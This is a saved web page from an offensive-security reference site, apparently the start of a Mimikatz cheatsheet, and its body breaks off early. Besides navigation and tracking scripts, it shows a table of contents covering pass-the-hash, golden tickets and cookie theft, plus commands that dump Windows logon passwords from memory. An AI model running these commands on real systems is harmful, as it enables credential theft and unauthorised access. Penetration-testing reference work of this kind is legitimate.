<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="A cheatsheet for using Mimikatz (all versions covered).">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="Windows - Mimikatz" />
<meta property="og:description" content="A cheatsheet for using Mimikatz (all versions covered)." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/windows_mimikatz/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2022-11-04T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
<title>Windows - Mimikatz | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce="v6fQG2hYHmw1rpUUC6mr9w"></script><script nonce="v6fQG2hYHmw1rpUUC6mr9w">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();</script>
<script>(function(){

'use strict';var aa=function(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}},ba="function"==typeof Object.create?Object.create:function(a){var b=function(){};b.prototype=a;return new b},k;if("function"==typeof Object.setPrototypeOf)k=Object.setPrototypeOf;else{var m;a:{var ca={a:!0},n={};try{n.__proto__=ca;m=n.a;break a}catch(a){}m=!1}k=m?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+" is not extensible");return a}:null}
var p=k,q=function(a,b){a.prototype=ba(b.prototype);a.prototype.constructor=a;if(p)p(a,b);else for(var c in b)if("prototype"!=c)if(Object.defineProperties){var d=Object.getOwnPropertyDescriptor(b,c);d&&Object.defineProperty(a,c,d)}else a[c]=b[c];a.v=b.prototype},r=this||self,da=function(){},t=function(a){return a};var u;var w=function(a,b){this.g=b===v?a:""};w.prototype.toString=function(){return this.g+""};var v={},x=function(a){if(void 0===u){var b=null;var c=r.trustedTypes;if(c&&c.createPolicy){try{b=c.createPolicy("goog#html",{createHTML:t,createScript:t,createScriptURL:t})}catch(d){r.console&&r.console.error(d.message)}u=b}else u=b}a=(b=u)?b.createScriptURL(a):a;return new w(a,v)};var A=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)};var B={},C=null;var D="function"===typeof Uint8Array;function E(a,b,c){return"object"===typeof a?D&&!Array.isArray(a)&&a instanceof Uint8Array?c(a):F(a,b,c):b(a)}function F(a,b,c){if(Array.isArray(a)){for(var d=Array(a.length),e=0;e<a.length;e++){var f=a[e];null!=f&&(d[e]=E(f,b,c))}Array.isArray(a)&&a.s&&G(d);return d}d={};for(e in a)Object.prototype.hasOwnProperty.call(a,e)&&(f=a[e],null!=f&&(d[e]=E(f,b,c)));return d}
function ea(a){return F(a,function(b){return"number"===typeof b?isFinite(b)?b:String(b):b},function(b){var c;void 0===c&&(c=0);if(!C){C={};for(var d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),e=["+/=","+/","-_=","-_.","-_"],f=0;5>f;f++){var h=d.concat(e[f].split(""));B[f]=h;for(var g=0;g<h.length;g++){var l=h[g];void 0===C[l]&&(C[l]=g)}}}c=B[c];d=Array(Math.floor(b.length/3));e=c[64]||"";for(f=h=0;h<b.length-2;h+=3){var y=b[h],z=b[h+1];l=b[h+2];g=c[y>>2];y=c[(y&3)<<
4|z>>4];z=c[(z&15)<<2|l>>6];l=c[l&63];d[f++]=""+g+y+z+l}g=0;l=e;switch(b.length-h){case 2:g=b[h+1],l=c[(g&15)<<2]||e;case 1:b=b[h],d[f]=""+c[b>>2]+c[(b&3)<<4|g>>4]+l+e}return d.join("")})}var fa={s:{value:!0,configurable:!0}},G=function(a){Array.isArray(a)&&!Object.isFrozen(a)&&Object.defineProperties(a,fa);return a};var H;var J=function(a,b,c){var d=H;H=null;a||(a=d);d=this.constructor.u;a||(a=d?[d]:[]);this.j=d?0:-1;this.h=null;this.g=a;a:{d=this.g.length;a=d-1;if(d&&(d=this.g[a],!(null===d||"object"!=typeof d||Array.isArray(d)||D&&d instanceof Uint8Array))){this.l=a-this.j;this.i=d;break a}void 0!==b&&-1<b?(this.l=Math.max(b,a+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(c)for(b=0;b<c.length;b++)a=c[b],a<this.l?(a+=this.j,(d=this.g[a])?G(d):this.g[a]=I):(d=this.l+this.j,this.g[d]||(this.i=this.g[d]={}),(d=this.i[a])?
G(d):this.i[a]=I)},I=Object.freeze(G([])),K=function(a,b){if(-1===b)return null;if(b<a.l){b+=a.j;var c=a.g[b];return c!==I?c:a.g[b]=G([])}if(a.i)return c=a.i[b],c!==I?c:a.i[b]=G([])},M=function(a,b){var c=L;if(-1===b)return null;a.h||(a.h={});if(!a.h[b]){var d=K(a,b);d&&(a.h[b]=new c(d))}return a.h[b]};J.prototype.toJSON=function(){var a=N(this,!1);return ea(a)};
var N=function(a,b){if(a.h)for(var c in a.h)if(Object.prototype.hasOwnProperty.call(a.h,c)){var d=a.h[c];if(Array.isArray(d))for(var e=0;e<d.length;e++)d[e]&&N(d[e],b);else d&&N(d,b)}return a.g},O=function(a,b){H=b=b?JSON.parse(b):null;a=new a(b);H=null;return a};J.prototype.toString=function(){return N(this,!1).toString()};var P=function(a){J.call(this,a)};q(P,J);function ha(a){var b,c=(a.ownerDocument&&a.ownerDocument.defaultView||window).document,d=null===(b=c.querySelector)||void 0===b?void 0:b.call(c,"script[nonce]");(b=d?d.nonce||d.getAttribute("nonce")||"":"")&&a.setAttribute("nonce",b)};var Q=function(a,b){b=String(b);"application/xhtml+xml"===a.contentType&&(b=b.toLowerCase());return a.createElement(b)},R=function(a){this.g=a||r.document||document};R.prototype.appendChild=function(a,b){a.appendChild(b)};var S=function(a,b,c,d,e,f){try{var h=a.g,g=Q(a.g,"SCRIPT");g.async=!0;g.src=b instanceof w&&b.constructor===w?b.g:"type_error:TrustedResourceUrl";ha(g);h.head.appendChild(g);g.addEventListener("load",function(){e();d&&h.head.removeChild(g)});g.addEventListener("error",function(){0<c?S(a,b,c-1,d,e,f):(d&&h.head.removeChild(g),f())})}catch(l){f()}};var ia=r.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),ja=r.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),ka=r.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),la=function(a,b,c){this.h=a;this.j=new R(this.h);this.g=null;this.i=[];this.l=!1;this.o=b;this.m=c},V=function(a){if(a.h.body&&!a.l){var b=
function(){T(a);r.setTimeout(function(){return U(a,3)},50)};S(a.j,a.o,2,!0,function(){r[a.m]||b()},b);a.l=!0}},T=function(a){for(var b=W(1,5),c=0;c<b;c++){var d=X(a);a.h.body.appendChild(d);a.i.push(d)}b=X(a);b.style.bottom="0";b.style.left="0";b.style.position="fixed";b.style.width=W(100,110).toString()+"%";b.style.zIndex=W(2147483544,2147483644).toString();b.style["background-color"]=ma(249,259,242,252,219,229);b.style["box-shadow"]="0 0 12px #888";b.style.color=ma(0,10,0,10,0,10);b.style.display=
"flex";b.style["justify-content"]="center";b.style["font-family"]="Roboto, Arial";c=X(a);c.style.width=W(80,85).toString()+"%";c.style.maxWidth=W(750,775).toString()+"px";c.style.margin="24px";c.style.display="flex";c.style["align-items"]="flex-start";c.style["justify-content"]="center";d=Q(a.j.g,"IMG");d.className=A();d.src=ia;d.style.height="24px";d.style.width="24px";d.style["padding-right"]="16px";var e=X(a),f=X(a);f.style["font-weight"]="bold";f.textContent=ja;var h=X(a);h.textContent=ka;Y(a,
e,f);Y(a,e,h);Y(a,c,d);Y(a,c,e);Y(a,b,c);a.g=b;a.h.body.appendChild(a.g);b=W(1,5);for(c=0;c<b;c++)d=X(a),a.h.body.appendChild(d),a.i.push(d)},Y=function(a,b,c){for(var d=W(1,5),e=0;e<d;e++){var f=X(a);b.appendChild(f)}b.appendChild(c);c=W(1,5);for(d=0;d<c;d++)e=X(a),b.appendChild(e)},W=function(a,b){return Math.floor(a+Math.random()*(b-a))},ma=function(a,b,c,d,e,f){return"rgb("+W(Math.max(a,0),Math.min(b,255)).toString()+","+W(Math.max(c,0),Math.min(d,255)).toString()+","+W(Math.max(e,0),Math.min(f,
255)).toString()+")"},X=function(a){a=Q(a.j.g,"DIV");a.className=A();return a},U=function(a,b){0>=b||null!=a.g&&0!=a.g.offsetHeight&&0!=a.g.offsetWidth||(na(a),T(a),r.setTimeout(function(){return U(a,b-1)},50))},na=function(a){var b=a.i;var c="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];b=c?c.call(b):{next:aa(b)};for(c=b.next();!c.done;c=b.next())(c=c.value)&&c.parentNode&&c.parentNode.removeChild(c);a.i=[];(b=a.g)&&b.parentNode&&b.parentNode.removeChild(b);a.g=null};var pa=function(a,b,c,d,e){var f=oa(c),h=function(l){l.appendChild(f);r.setTimeout(function(){f?(0!==f.offsetHeight&&0!==f.offsetWidth?b():a(),f.parentNode&&f.parentNode.removeChild(f)):a()},d)},g=function(l){document.body?h(document.body):0<l?r.setTimeout(function(){g(l-1)},e):b()};g(3)},oa=function(a){var b=document.createElement("div");b.className=a;b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.left="-10000px";b.style.top="-10000px";b.style.zIndex="-10000";return b};var L=function(a){J.call(this,a)};q(L,J);var qa=function(a){J.call(this,a)};q(qa,J);var ra=function(a,b){this.l=a;this.m=new R(a.document);this.g=b;this.i=K(this.g,1);b=M(this.g,2);this.o=x(K(b,4)||"");this.h=!1;b=M(this.g,13);b=x(K(b,4)||"");this.j=new la(a.document,b,K(this.g,12))};ra.prototype.start=function(){sa(this)};
var sa=function(a){ta(a);S(a.m,a.o,3,!1,function(){a:{var b=a.i;var c=r.btoa(b);if(c=r[c]){try{var d=O(P,r.atob(c))}catch(e){b=!1;break a}b=b===K(d,1)}else b=!1}b?Z(a,K(a.g,14)):(Z(a,K(a.g,8)),V(a.j))},function(){pa(function(){Z(a,K(a.g,7));V(a.j)},function(){return Z(a,K(a.g,6))},K(a.g,9),K(a.g,10),K(a.g,11))})},Z=function(a,b){a.h||(a.h=!0,a=new a.l.XMLHttpRequest,a.open("GET",b,!0),a.send())},ta=function(a){var b=r.btoa(a.i);a.l[b]&&Z(a,K(a.g,5))};(function(a,b){r[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];r[a]=da;b.apply(null,d)}})("__h82AlnkH6D91__",function(a){"function"===typeof window.atob&&(new ra(window,O(qa,window.atob(a)))).start()});}).call(this);

window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hVTV9oOG1BMHF6c2xHRlBZR0xrS2g0UHRVX21ERkZSWVBjcTFBZU1aN0diVW5xSGRzNlR5OUZTYWlsM0thZ28tb19BU3hqbjRyZFdLOGhzVUlHbmFqalZRXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZScnBMVGFzQ1JjSDBxSkpfSVhRWmd1YXQxZ292Ty01YlN0WUJXNGJUTThTNjlTdUU0WkVQVnZKZ0E2WC1UY1VNTlRLbXc3V1hLU2NoY1pJaHFOTVJ2UmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFUxMG44RWlxNnBhUEw5Q1lOcjBZcG1xdTVuZzVzTkR3Zm5yN1pSRVExWEt5UlBLMFJxS1RST2Y0Q3B5S0pIUFpVem83MldIU3VrbWlKb1p4c2Y2RzJwLWdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZDb2RlRVZCbFQxdXA5MUMzZ0V0dVFROVVxbVBSVGwwS2Qyc1FqcF9GWHV3WGxFYUhVekNvSWIxUzJtQnZ4T3Q5eHJra19vNWRXbWFfYl83dl9JRlVpeHdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VjRnWnE1WHlLaXVNS3lHdUU1Y2ZISDdoNWUtb0VVZktOekNTWEgzYmN2U285OTNYLTFuc0VkU19SZjRjUTNYZjZJSEdyaGFIb1FNc1hqMFhZUGcwMFU5d1x1MDAzZFx1MDAzZCJd");</script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="active">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Windows - Mimikatz</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#windows---mimikatz">Windows - Mimikatz</a>
      <ul>
        <li><a href="#mimikatz---execute-commands">Mimikatz - Execute commands</a></li>
        <li><a href="#mimikatz---extract-passwords">Mimikatz - Extract passwords</a></li>
        <li><a href="#mimikatz---lsa-protection-workaround">Mimikatz - LSA Protection Workaround</a></li>
        <li><a href="#mimikatz---mini-dump">Mimikatz - Mini Dump</a></li>
        <li><a href="#mimikatz---pass-the-hash">Mimikatz - Pass The Hash</a></li>
        <li><a href="#mimikatz---golden-ticket">Mimikatz - Golden ticket</a></li>
        <li><a href="#mimikatz---skeleton-key">Mimikatz - Skeleton key</a></li>
        <li><a href="#mimikatz---rdp-session-takeover">Mimikatz - RDP session takeover</a></li>
        <li><a href="#mimikatz---credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a>
          <ul>
            <li><a href="#chrome-cookies--credential">Chrome Cookies &amp; Credential</a></li>
            <li><a href="#task-scheduled-credentials">Task Scheduled credentials</a></li>
            <li><a href="#vault">Vault</a></li>
          </ul>
        </li>
        <li><a href="#mimikatz---commands-list">Mimikatz - Commands list</a></li>
        <li><a href="#mimikatz---powershell-version">Mimikatz - Powershell version</a></li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="windows---mimikatz">
  Windows - Mimikatz
  <a class="anchor" href="#windows---mimikatz">#</a>
</h1>
<p><img src="http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png" alt="Data in memory" /></p>
<h2 id="mimikatz---execute-commands">
  Mimikatz - Execute commands
  <a class="anchor" href="#mimikatz---execute-commands">#</a>
</h2>
<p>Only one command</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\temp\mimikatz&gt; .\mimikatz <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonpasswords&#34;</span> exit
</span></span></code></pre></div><p>Mimikatz console (multiple commands)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\temp\mimikatz&gt; .\mimikatz
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># privilege::debug</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># log</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::logonpasswords</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::wdigest</span>
</span></span></code></pre></div><h2 id="mimikatz---extract-passwords">
  Mimikatz - Extract passwords
  <a class="anchor" href="#mimikatz---extract-passwords">#</a>
</h2>
<blockquote>
